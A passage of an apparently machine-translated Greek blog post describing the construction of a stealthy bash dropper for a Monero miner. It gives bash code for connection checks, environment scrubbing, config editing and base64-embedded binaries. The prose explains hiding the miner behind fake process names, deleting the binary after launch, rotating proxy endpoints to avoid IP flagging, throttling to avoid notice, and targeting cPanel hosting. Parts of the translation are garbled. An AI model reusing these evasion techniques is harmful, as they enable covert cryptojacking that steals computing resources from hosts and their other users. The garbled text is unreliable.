}</code></pre><p>Αυτή η λειτουργία βασίζεται σε<a href=https://ipinfo.io/> ipinfo</a> για τον προσδιορισμό της περιοχής του εργαζομένου, ο οποίος επιτρέπει τη ρύθμιση κάποιας λογικής που εξαρτάται από την περιοχή,<a href=\assets/posts/geoip.json> geoip.json</a> ομαδοποιεί τις χώρες σε περιοχές, αφού θέλουμε την περιοχή ανώτατου επιπέδου και δεν μας ενδιαφέρει η συγκεκριμένη χώρα.<pre><code class="bash hljs"><span class=hljs-comment># try to open a connection to host $1 with port $2 and output to $3</span><span class=hljs-function><span class=hljs-title>open_connection</span></span>() {
    <span class=hljs-built_in>exec</span> {socket}<>/dev/tcp/<span class=hljs-variable>${1}</span>/<span class=hljs-variable>${2}</span> 2>/dev/null
    <span class=hljs-built_in>echo</span><span class=hljs-variable>$socket</span> >&<span class=hljs-variable>${3}</span>
}

<span class=hljs-comment>## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class=hljs-function><span class=hljs-title>check_connection</span></span>() {
    <span class=hljs-built_in>local</span> host=<span class=hljs-variable>$1</span> port=<span class=hljs-variable>$2</span> conn_socket=
    [ -z <span class=hljs-string>"<span class=hljs-variable>$host</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no host provided'</span>; <span class=hljs-built_in>return</span> 1; }
    [ -z <span class=hljs-string>"<span class=hljs-variable>$port</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no port provided'</span>; <span class=hljs-built_in>return</span> 1; }
    newfd conn_socket
    <span class=hljs-built_in>timeout</span> 3 open_connection <span class=hljs-variable>$host</span><span class=hljs-variable>$port</span><span class=hljs-variable>$conn_socket</span><span class=hljs-comment># read the fd of the opened connection from the conn_socket fd and close it</span>
    read_fd <span class=hljs-variable>$conn_socket</span> avl -
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$avl</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment># close connection</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>${avl}</span><&-"</span> &>/dev/null
        <span class=hljs-built_in>return</span> 0 <span class=hljs-comment>## connection can be established</span><span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## connection can't be established</span><span class=hljs-keyword>fi</span>
}</code></pre><p>Το Bash έχει υποστήριξη για συνδέσεις tcp, έχοντας μια αφαίρεση over<code>/dev/tcp</code> (επίσης για udp, αλλά τα περισσότερα φαίνεται να είναι συνήθως απενεργοποιημένα κατά τη διάρκεια της κατασκευής, οπότε δεν μπορείτε να βασιστείτε σε αυτό). Αυτά τα αρχεία είναι κάτι bash, δεν αποτελούν μέρος του linux<code>/dev</code> δέντρο.<p>Αξίζει να αναφερθεί επίσης ένα σύστημα κλειδώματος για τον χειρισμό της ταυτόχρονης λειτουργίας μεταξύ των εργασιών bash. Για να επιτρέψουν σε πολλές εργασίες να λειτουργούν με κλειδαριές, όλες πρέπει να μοιραστούν έναν περιγραφέα αρχείων, οπότε το δικό μας<code>locker</code> που είναι επίσης μια δουλειά, πρέπει να ξεκινήσει πριν από άλλες εργασίες που επιθυμούν να χρησιμοποιήσουν την κλειδαριά. Το ντουλάπι απλώς διαβάζει<code>stdin</code> περιμένοντας αιτήματα κλειδώματος, απαντώντας<code>stdout</code> ανάλογα με την τρέχουσα κατάσταση boolean που είναι αποθηκευμένη σε μια μεταβλητή. Δεν εγγυώμαι ότι αυτή η προσέγγιση είναι χωρίς αγώνα, αλλά φαίνεται να λειτουργεί αξιοπρεπώς, από την άλλη πλευρά, βρήκα ότι οι περιγραφείς αρχείων δεν είναι πολύ αξιόπιστοι, καθώς υποψιάζομαι ότι υπάρχουν ορισμένα buffer που δεν ξεπλένονται κάπου κάτω<em> σωλήνες</em> και τελικά να χτυπήσει αδιέξοδα (που σημαίνει ότι δεν μπορείς να βασίζεσαι στο ντουλάπι που σου δίνει συνέχεια μια απάντηση).<pre><code class="bash hljs"><span class=hljs-comment>## unset bash env apart excluded vars/funcs</span><span class=hljs-function><span class=hljs-title>clear_env</span></span>(){
    <span class=hljs-built_in>local</span><span class=hljs-built_in>functions</span>=$(<span class=hljs-built_in>declare</span> -F)
    <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions//declare -f }</span><span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/$u[[:space:]]}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>local</span> vars=$(<span class=hljs-built_in>set</span> -o posix; <span class=hljs-built_in>set</span> | <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-built_in>echo</span><span class=hljs-variable>${l/=*}</span>; <span class=hljs-keyword>done</span>)
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        vars=<span class=hljs-variable>${vars/$u[[:space:]]}</span>
        vars=<span class=hljs-variable>${vars/[[:space]]$u}</span>
        vars=<span class=hljs-variable>${vars/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>unset</span> -f <span class=hljs-variable>$functions</span> &>/dev/null
    <span class=hljs-built_in>unset</span> -v <span class=hljs-variable>$vars</span> &>/dev/null
    <span class=hljs-comment># unset $vars &>/dev/null</span>
}

<span class=hljs-comment>## unexport most variables</span><span class=hljs-function><span class=hljs-title>dex_env</span></span>() {
    exported=$(<span class=hljs-built_in>export</span> -p)
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> e; <span class=hljs-keyword>do</span>
        n=<span class=hljs-variable>${e/declare -*x }</span>
        [ <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> = <span class=hljs-string>"<span class=hljs-variable>$e</span>"</span> ] && <span class=hljs-built_in>continue</span><span class=hljs-comment>## multiline var</span>
        n=<span class=hljs-variable>${n/=*}</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$n</span>"</span><span class=hljs-keyword>in</span><span class=hljs-string>"SHELL"</span>|<span class=hljs-string>"USER"</span>|<span class=hljs-string>"HOME"</span>|<span class=hljs-string>"TMUX"</span>|<span class=hljs-string>"CHARSET"</span>|<span class=hljs-string>"TERM"</span>)
                <span class=hljs-built_in>continue</span>
                ;;
            *)
                dexported=<span class=hljs-string>"<span class=hljs-variable>$dexported</span><span class=hljs-variable>${n/=*}</span>"</span><span class=hljs-keyword>esac</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-variable>$exported</span>"</span><span class=hljs-built_in>export</span> -n <span class=hljs-variable>$dexported</span>
}</code></pre><p>Καθαρίστε τα σκουπίδια σας ... τα περίπλοκα προγράμματα bash καταλήγουν να χρησιμοποιούν πολλές μεταβλητές και αν κάνετε κατάχρηση του παγκόσμιου χώρου γίνεται φουσκωτό. Εάν αναπαράγετε εργασίες με κέλυφος, κληρονομούν όλο το περιβάλλον (το οποίο ουσιαστικά αντιγράφεται, δεν μοιράζεται), μπορείτε γρήγορα να καταλήξετε σε τρελό φαγητό<code>100M</code> μνήμης, όχι ωραίο. Επίσης, θέλουμε πραγματικά να είμαστε χαμηλού προφίλ. Στο σενάριο ανάπτυξης μας, ο αντίπαλος<sup id=fnref:adversary><a class=fnref href=#fndef:adversary>[1]</a></sup> μπορεί δυνητικά να έχει πρόσβαση root και πλήρεις πληροφορίες σχετικά με τις διαδικασίες μας<sup id=fnref:infoproc><a class=fnref href=#fndef:infoproc>[2]</a></sup> , και ξέρετε ... κάθε διαδικασία περιέχει πληροφορίες σχετικά με την πλήρη εντολή που την ξεκίνησε και τις εξαγόμενες μεταβλητές περιβάλλοντος.<h2 id=configuration><a class=header-anchor href=#configuration> Διαμόρφωση</a></h2><p>Μόλις έχουμε το περιβάλλον και τα εργαλεία μας, πρέπει να συντονίσουμε τον ανθρακωρύχο μας για το μηχάνημα στο οποίο λειτουργεί, βήματα διαμόρφωσης σε ψευδοκώδικα:<ul><li><p>όνομα διαδικασίας για τον ανθρακωρύχο<li><p>πληροφορίες κεντρικού υπολογιστή (ram/cores/caches/<code>ENV_VARS</code>)<li><p>έκδοση διαμόρφωσης<li><p><code>worker_id</code> για τον ανθρακωρύχο (από ip και host)<li><p>ip/port για τη σύνδεση</ul><p>Η επιλογή ενός ονόματος για τη διαδικασία απαιτείται<em> κρύβω</em> το γεγονός ότι τρέχουμε έναν ανθρακωρύχο, αλλά δεν μετονομάζουμε μόνο στο δυαδικό μας, έχουμε μια λίστα με<strong> μάσκες</strong> για πιθανούς υποψηφίους (ένα απλό αρχείο κειμένου όπου κάθε γραμμή είναι μια μάσκα):<ul><li><p>επιλέξτε μια μάσκα τυχαία<li><p>ανακατέψτε τα στοιχεία της ουράς της συμβολοσειράς (όλα εκτός από την πρώτη) για να λάβετε μια διαφορετική εντολή διεργασίας. Τώρα έχουμε μια συμβολοσειρά που μοιάζει<code>cmd --arg2 --arg1 --arg3</code> Το Αυτή είναι η μάσκα ανθρακωρύχου μας, τρέχουμε το δυαδικό<em> χωρίς</em> επιχειρήματα, αλλά φαίνεται ότι ξεκινήσαμε μια εντολή<code>cmd</code> με επιχειρήματα<code>--arg1 --arg2 --arg3</code> Το Τα διαστήματα και οι παύλες επιτρέπονται σε ονόματα αρχείων, επομένως είναι καλό να εκτελείτε ένα δυαδικό όνομα όπως αυτό, δεν φαίνεται ότι το linux κάνει διάκριση μεταξύ του εκτελέσιμου και των ορισμάτων κατά την αποθήκευση των εντολών διεργασίας.<p>Η διαμόρφωση του ανθρακωρύχου φορτώνεται αυτόματα από<code>$PWD</code>.</ul><h3 id=hashrate><a class=header-anchor href=#hashrate> Hashrate</a></h3><p>, με τον καιρό, ο ανάντη ανθρακωρύχος πήρε πολλά<strong> αυτόματο συντονισμό</strong> Χαρακτηριστικά, έτσι έκανε μέρος των σεναρίων μου περιττό, αλλά η διαφορά μεταξύ ανάντη και κατάντη εδώ είναι ότι ο ανάντι στόχος είναι η μεγιστοποίηση<em> εκτέλεση</em> , ενώ στόχος μας είναι να μεγιστοποιήσουμε<em> αποτελεσματικότητα και συσκότιση</em> , δεν θέλουμε να προσπεράσουμε το σύστημα, θέλουμε να κάνουμε βδέλλα λίγο χωρίς διακοπή της υπηρεσίας.<sup id=fnref:monerominer><a class=fnref href=#fndef:monerominer>[3]</a></sup><p>Για αυτό, χρειαζόμαστε μια πιο λεπτομερή κατανόηση του περιβάλλοντος<code>l2/l3</code> δομή cache του επεξεργαστή, του ram και των πυρήνων και του τρέχοντος επεξεργαστή<em> μέση τιμή</em> φόρτωση και cpu<em> χρήση</em>Το Προσπάθησα να φτιάξω ένα<a href=https://en.wikipedia.org/wiki/Finite-state_machine> κρατική μηχανή</a> σε bash που θα ξεκινούσε από το ελάχιστο και θα προσπαθούσε διαφορετικές διαμορφώσεις να προσαρμόζονται αργά στο μέσο όρο. Ήταν ένα<strong> τεράστιος</strong> σπατάλη προσπάθειας γεμάτη<a href=https://en.wikipedia.org/wiki/Technical_debt> τεχνικό χρέος</a> που χρεοκόπησε πολύ γρήγορα και απορρίφθηκε ως επί το πλείστον, με μόνο υπολείμματα να παραμένουν στη βάση κωδικών.<p>Σπάστε όλο αυτό το jumbo αυτόματου συντονισμού, μόλις κάναμε τον ανθρακωρύχο να κοιμηθεί ανάλογα με τη χρήση/το φορτίο του κεντρικού υπολογιστή, αυτό απαιτούσε τροποποιήσεις του miner στο<code>sleep</code> μεταξύ αποδόσεων νημάτων και μερικές επιδιορθώσεις στο φύλακα παραμετροποίησης<sup id=fnref:configwatch><a class=fnref href=#fndef:configwatch>[4]</a></sup> , το οποίο θα μας επέτρεπε να φορτώσουμε ξανά το ποσό ύπνου κατά τη διάρκεια του χρόνου εκτέλεσης. Η λογική είναι πολύ πιο απλοποιημένη και μοιάζει με αυτό:<ul><li><p>εάν η χρήση είναι πάνω/κάτω από $ TARGET_USAGE (gin περιθώριο σφάλματος) αύξηση/μείωση του ύπνου<li><p>εάν το μέσο φορτίο εντός<code>1m</code> είναι πάνω/κάτω από $ TARGET_LOAD παύση/συνέχιση εξόρυξης</ul><h3 id=connection><a class=header-anchor href=#connection> Σύνδεση</a></h3><p>Στο bash roundup μας δείξαμε βοηθητικά προγράμματα για σύνδεση. Γιατί τα χρειαζόμαστε αυτά; Επειδή χρειαζόμαστε διαφορετικότητα. απλά η σκληρή κωδικοποίηση ενός τελικού σημείου στη διαμόρφωση δεν θα διαρκέσει πολύ, όταν κάτι φαίνεται ύποπτο και έχει δραστηριότητα δικτύου, οι IP επισημαίνονται.<p>Στην αρχή πειραματιστήκαμε με δύο μεθόδους:<ul><li><p>χρησιμοποιώντας<a href=https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains> proxychains</a> για να υπερφορτώσετε τις κλήσεις του δικτύου ανθρακωρύχων, αλλά απαιτούσε τον ανθρακωρύχο να κατασκευαστεί με δυναμικές βιβλιοθήκες και έπρεπε να τις στείλετε με το ωφέλιμο φορτίο, οπότε ήταν ανέφικτο.<li><p>τρέξιμο α<a href=https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost> μπροστινή σήραγγα</a> δίπλα -δίπλα με τον ανθρακωρύχο: αυτό είχε πολλές ρυθμίσεις από πάνω, καθώς τώρα διαμορφώναμε δύο διαδικασίες σε κάθε ανάπτυξη, οι οποίες ανέρχονταν σε περισσότερα σφάλματα.</ul><p>Στο τέλος καταλήξαμε με την αποστολή μόνο μιας λίστας τελικών σημείων, αποθηκευμένων σε μεταβλητές bash, επιλέγοντας ένα τυχαία. Οι συνδέσεις ήταν φυσικά κρυπτογραφημένες. Ποια είναι αυτά τα τελικά σημεία; Μεταφορείς στον πληρεξούσιο που θα χειρίζονταν τις εργασίες των ανθρακωρύχων.</p><img src=/assets/posts/chronichles_of_a_cryptonote_dropper/code/output/miner.png><p>Γιατί χρειαζόμαστε α<a href=https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy> πληρεξούσιο εξόρυξης</a> ; Δεν πέρασα ποτέ από ταυτόχρονες συνδέσεις ~ 100, οπότε ένας διακομιστής μεσολάβησης δεν ήταν πραγματικά απαραίτητος για τη φόρτωση του δικτύου, αλλά ήταν βολικός για τη διαπραγμάτευση του αλγορίθμου κατακερματισμού και για την παροχή διαφορετικών στόχων δυσκολίας σε διαφορετικούς ανθρακωρύχους, για να αποτρέψει τους ανθρακωρύχους να εργάζονται<strong> δυσκολία</strong> στόχους που θα τους έπαιρνε πολύ χρόνο για να ολοκληρώσουν και να αποφύγουν τον κίνδυνο σπατάλης υπολογισμού σε ημιτελείς εργασίες.<sup id=fnref:difficulty><a class=fnref href=#fndef:difficulty>[5]</a></sup> Το λογισμικό της πισίνας απαιτούσε επίσης μερικές τροποποιήσεις καθώς ευτυχώς διαφήμιζε να είναι διακομιστής μεσολάβησης σε απλά http αιτήματα ...<em> που έπρεπε να λήξει</em> , και ένα πιρούνι πρόσθεσε έλεγχο πρόσβασης, οπότε βασίσαμε τις λειτουργίες μας σε αυτό.<sup id=fnref:stratumprotocol><a class=fnref href=#fndef:stratumprotocol>[6]</a></sup><h3 id=editing_json><a class=header-anchor href=#editing_json> Επεξεργασία json</a></h3><p>Εφαρμόζοντας τροποποιήσεις σε ένα αρχείο json με απλώς bash τα καταφέραμε με κάποια αντικατάσταση env var και κάποια regex. Αρχικά βασιζόμασταν σε ένα<code>envsubst</code> δυαδικό για την εφαρμογή μεταβλητών, μετά πήγαμε στο πλήρες bash<sup id=fnref:fullbash><a class=fnref href=#fndef:fullbash>[7]</a></sup> με αυτή τη λογική:<ul><li><p>διαβάστε το πρότυπο διαμόρφωσης<li><p>αντικαταστήστε όλα τα εισαγωγικά με μια πολύ εσωτερική συμβολοσειρά (όπως<code>_#_#</code>)<li><p><code>eval</code> το πρότυπο<li><p>αντικαταστήστε όλα τα εσωτερικά γεγονότα πίσω με εισαγωγικά</ul><p>Εκτός από την αποφυγή δευτερευουσών διαδικασιών, ένα άλλο πλεονέκτημα είναι ότι έχουμε πλήρεις δυνατότητες bash στα πρότυπά μας. Για ανάγνωση και γραφή χωρίς πρότυπα, πρέπει να βασιστούμε στις δυνατότητες bash regex:<pre><code class="bash hljs">cc_rgx=<span class=hljs-string>'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>change_config</span></span>() {
	<span class=hljs-built_in>local</span> subs
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$cc_rgx</span> ]]
			matches=(<span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[@]}</span>"</span>)
			[ -n <span class=hljs-string>"<span class=hljs-variable>${matches[3]}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>${2:0:1}</span>"</span> != <span class=hljs-string>"\""</span> ] &&
				subs=<span class=hljs-string>"\"<span class=hljs-variable>$2</span>\""</span> ||
				subs=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
			CONFIG=<span class=hljs-variable>${CONFIG/<span class=hljs-variable>${matches[0]}</span>/<span class=hljs-variable>${matches[1]}</span>$subs<span class=hljs-variable>${matches[5]}</span>}</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}

<span class=hljs-comment>## output miner config value $1 unquoted</span>
gc_rgx=<span class=hljs-string>' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>get_config</span></span>() {
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$gc_rgx</span> ]]
			[ -n <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ] &&
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ||
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[3]}</span>"</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}</code></pre><p>Αυτό μας επιτρέπει μόνο να επεξεργαζόμαστε μεμονωμένες γραμμές, για καταχωρήσεις πολλαπλών γραμμών θεωρεί απλώς την πρώτη γραμμή..αλλά είναι αρκετά καλό για την περίπτωση χρήσης μας.<h2 id=runtime><a class=header-anchor href=#runtime> Διάρκεια εκτέλεσης</a></h2><p>Πώς μοιάζει ο χρόνος εκτέλεσης μας; Έχουμε μια κύρια διαδικασία bash που εκτελεί τον κύριο βρόχο, στη συνέχεια την υπο-διαδικασία miner, την υπο-διαδικασία της οθόνης cpu, το ντουλάπι και το δέκτη. Αυτό είναι σχεδόν μια χούφτα.<p>Πρώτα θέλουμε να διασφαλίσουμε ότι εάν κάτι πάει στραβά, δεν αφήνουμε χάος, αυτό σημαίνει ότι χρησιμοποιούμε μια παγίδα για να εκτελέσουμε καθαρισμούς κατά τον τερματισμό<pre><code class="bash hljs"><span class=hljs-built_in>trap</span><span class=hljs-string>"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code> αποσυνδέει την παγίδα για να αποτρέψει την υποτροπή. Η παγίδα σκοτώνει όλες τις δουλειές και αφαιρεί το εργασιακό περιβάλλον.<p>It'sρθε η ώρα να ξεκινήσετε το miner, το οποίο αποθηκεύεται ως μεταβλητή bash στην κωδικοποίηση base64. Το ρίχνουμε στο σύστημα αρχείων, στη συνέχεια ρίχνουμε το config, εκτελούμε το miner και αφαιρούμε τόσο τον miner όσο και το config. Στο linux μπορείτε να καταργήσετε το εκτελέσιμο μιας τρέχουσας διαδικασίας, (στα Windows αυτό δεν επιτρέπεται).<sup id=fnref:memoryondemand><a class=fnref href=#fndef:memoryondemand>[8]</a></sup> Όταν εκτελείται ο ανθρακωρύχος, στο σύστημα αρχείων υπάρχει μόνο ένα<code>.. /</code> κατάλογος με α<code>b64</code> σύνδεσμος σε αυτό.<pre><code class="bash hljs"><span class=hljs-comment>## put a file $1 into a var $2</span><span class=hljs-function><span class=hljs-title>fileToVar</span></span>(){
    <span class=hljs-built_in>declare</span> -n tmpd=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span> && tmpd=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>) && <span class=hljs-built_in>return</span><span class=hljs-keyword>if</span> [ -z <span class=hljs-string>"<span class=hljs-variable>$tmpd</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>log</span><span class=hljs-string>"gobbling in array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$2</span>=1"</span><span class=hljs-comment>## avoid empty checks</span>
        gobbled[<span class=hljs-variable>$2</span>]=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>)
    <span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## do not quote assignment otherwise ram is not released</span><span class=hljs-keyword>fi</span>
}
<span class=hljs-comment>## put a var $1 into a file $2</span><span class=hljs-function><span class=hljs-title>varToFile</span></span>(){
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$VERBOSE</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n 2>><span class=hljs-variable>${VERBOSE}</span> && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" >\"<span class=hljs-variable>$2</span>\""</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" >\"<span class=hljs-variable>$2</span>\""</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>fi</span>
}</code></pre><p>Ένα τρελό παράδοξο που συναντήθηκε με το bash κατά την κωδικοποίηση του ανθρακωρύχου είναι ότι η εκχώρηση μιας μεταβλητής με ένα υποφλοιό με εισαγωγικά<code>myvar="$(something)"</code> προκαλεί μια μόνιμη αύξηση στη χρήση της μνήμης, αυτό ήταν δύσκολο να διορθωθεί και δεν βρήκα πραγματικά τον λόγο για τον οποίο συμπεριφέρεται έτσι, ούτως ή άλλως η ανάθεση πρέπει να είναι χωρίς αναφορά. Η αποκωδικοποίηση γίνεται αντί για<em> herestrings</em> η οποία είναι μια αφαίρεση σε προσωρινά αρχεία, η μεταβλητή απορρίπτεται σε ένα αρχείο που στη συνέχεια διοχετεύεται ξανά στη διαδικασία.<p>Ο βρόχος μακράς λειτουργίας του ανθρακωρύχου:<ul><li><p>ενώ ισχύει<ul><li><p>σταματήστε τον ανθρακωρύχο<li><p>κατάργηση διαμόρφωσης<li><p>εκκίνηση ανθρακωρύχου<li><p>ενώ ισχύει<ul><li><p>εκκίνηση δαίμονα<ul><li><p>ενώ ο ανθρακωρύχος τρέχει<ul><li><p>διαβάστε την έξοδο από τον ανθρακωρύχο<li><p>επιλέξτε δράση miner με βάση τη γραμμή εξόδου</ul></ul><li><p>εάν ο ανθρακωρύχος δεν λειτουργεί: διακοπή</ul><li><p>ύπνος</ul></ul><p>Η γραμμή εξόδου ταιριάζει με κάποιο regex:<pre><code class="bash hljs">act_rgx=<span class=hljs-string>'(accepted|speed|paused|algo:|-> update config|-> publish config|-> trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p>Ο δαίμονας χειρίζεται περιπτώσεις όπου<ul><li><p>η σύνδεση με το τελικό σημείο δίνει σφάλματα (επιλέξτε ένα νέο τυχαίο τελικό σημείο)<li><p>ο αλγόριθμος κατακερματισμού αλλάζει (προσαρμόστε τον χρόνο ύπνου και τις διαμορφώσεις ad-hoc)<li><p>προβλήματα ανθρακωρύχου (επανεκκίνηση του ανθρακωρύχου).</ul><p>Για λίγο υπήρχε υποστήριξη για τον πίνακα ελέγχου εντολών και ελέγχου, ο οποίος επέτρεπε την ενεργοποίηση χειροκίνητων επανεκκινήσεων, ωστόσο επειδή η χρήση του ήταν ελάχιστη απορρίφθηκε και τα τελικά σημεία του αντικαταστάθηκαν με μια εναλλακτική σύνδεση πισίνας, επίσης η διαδικασία επανεκκίνησης ήταν ασταθής, περίπλοκη. ..μια άλλη περίπτωση τεχνολογικού χρέους. Ωστόσο, επέτρεψε την επαναφόρτωση ενός ενημερωμένου ωφέλιμου φορτίου και την εκ νέου ρύθμιση όλων των διαμορφώσεων εν κινήσει, το οποίο ήταν αρκετά δροσερό, το απόλυτο τραμπολίνο.<h2 id=debugging><a class=header-anchor href=#debugging> Αποσφαλμάτωση</a></h2><p>Υπάρχουν τρία βασικά βοηθητικά προγράμματα<ul><li><p>ενεργοποιήστε/απενεργοποιήστε την παρακολούθηση γύρω από μπλοκ κώδικα (δεν θέλουμε να εντοπίσουμε ένα δυαδικό κωδικοποιημένο b64 σε μια μεταβλητή ..)<li><p>μια απλή λειτουργία για τη μορφοποίηση αρχείων καταγραφής<li><p>μια σημαία που θα ενεργοποιούσε τη λεπτομερή καταγραφή κατά την εκτέλεση κάθε φορά που ξεκινούσε ο ανθρακωρύχος.<ul><li><p>κάνει το αρχείο<code>.debug</code> υπάρχει?<ul><li><p>ενεργοποιήστε τη λεπτομερή καταγραφή</ul></ul></ul><h2 id=target_deployments><a class=header-anchor href=#target_deployments> Στόχευση αναπτύξεων</a></h2><p>Αυτή η ρύθμιση έχει δοκιμαστεί σε 3 είδη κεντρικών υπολογιστών:<h3 id=self_hosted_containers_or_vms><a class=header-anchor href=#self_hosted_containers_or_vms> Αυτοεξυπηρετούμενα κοντέινερ ή εικονικά μηχανήματα</a></h3><p>Σε πολλούς παρόχους φιλοξενίας δεν αρέσει η εξόρυξη, καθώς οι πόροι της CPU τείνουν να μοιράζονται μεταξύ πολλών χρηστών και το λογισμικό εξόρυξης μπορεί εύκολα να επιβραδύνει έναν κόμβο κεντρικού υπολογιστή που επηρεάζει την απόδοση για τους υπόλοιπους χρήστες. Αυτό μπορεί να ισχύει ακόμη και αν ο χρόνος χρήστη της CPU είναι απεριόριστος, επειδή οι αλγόριθμοι κατακερματισμού μπορούν να κορεστούν όλα τα επίπεδα προσωρινής αποθήκευσης της CPU εάν η προσωρινή μνήμη μοιράζεται σε όλους τους πυρήνες της CPU.<p>Θα θέλαμε να χρησιμοποιήσουμε το δικό μας<em> έκθεση</em> μερίδιο πόρων χωρίς απαγόρευση, αυτό είναι μια καλή περίπτωση χρήσης για το stepper dropper, δεδομένου ότι γνωρίζει τη χρήση του κεντρικού υπολογιστή, πράγμα που σημαίνει ότι<em> πρέπει</em> μείνετε κάπως εντός [AUP]. Δεν υπάρχουν επιπλέον βήματα όταν ασχολείστε με αναπτύξεις που φιλοξενούνται μόνο, μόνο το σενάριο εκκίνησης, που μπορεί να προστεθεί στην ακολουθία εκκίνησης ή να ξεκινήσει χειροκίνητα.<h3 id=cpanel_based_web_hosting><a class=header-anchor href=#cpanel_based_web_hosting> φιλοξενία ιστοσελίδων με βάση το cPanel</a></h3><p>Τα προγράμματα συνδρομών φιλοξενίας ιστοσελίδων προσφέρονται ως επί το πλείστον μέσω του [cPanel]. Και πάλι εδώ χρησιμοποιούμε προσωπικά 